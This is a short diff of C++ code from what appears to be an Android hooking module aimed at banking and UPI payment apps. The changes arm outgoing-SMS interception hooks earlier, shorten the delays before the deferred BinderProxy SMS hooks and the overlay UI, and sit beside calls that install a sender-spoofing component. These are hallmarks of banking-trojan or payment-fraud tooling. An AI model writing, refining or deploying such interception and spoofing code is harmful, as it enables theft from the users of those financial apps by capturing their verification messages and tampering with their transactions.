@@ -269,7 +269,7 @@ public:
         } else if (fragile_) {
             // Intent PLT ONLY in pre (armed=false) — Hero SENDTO catch without open crash
             // Binder PLT still forbidden on banking
-            bool intent_ok = outgoing_sms_hook::install_intent_plt_pre(api_, false);
+            bool intent_ok = outgoing_sms_hook::install_intent_plt_pre(api_, true);
             report_line(api_, std::string("fragile_intent_plt:") + pkg_ +
                                   (intent_ok ? "|ok" : "|fail"));
         } else {
@@ -317,13 +317,13 @@ public:
             sender_spoof::install(env_, api_, pkg_.c_str());
             report_line(api_, "post_msg_ok:" + pkg_);
         } else if (fragile_) {
-            // SMSTweaks-style: wait for UI, then JNI BinderProxy + phone + sender
-            const int delay = is_yespay(pkg_) ? 4 : 2;
+            // SMSTweaks: Intent PLT armed ASAP + short deferred BinderProxy
+            outgoing_sms_hook::arm_intercept_hooks();
+            const int delay = is_yespay(pkg_) ? 2 : 1;
             schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
             report_line(api_, "post_fragile_deferred:" + pkg_ + "|d=" + std::to_string(delay));
-            // Bubble after hooks settle
             if (native_overlay_wanted()) {
-                schedule_overlay_ui(env_, api_, pkg_, delay + 2);
+                schedule_overlay_ui(env_, api_, pkg_, delay + 1);
             }
         } else {
             outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
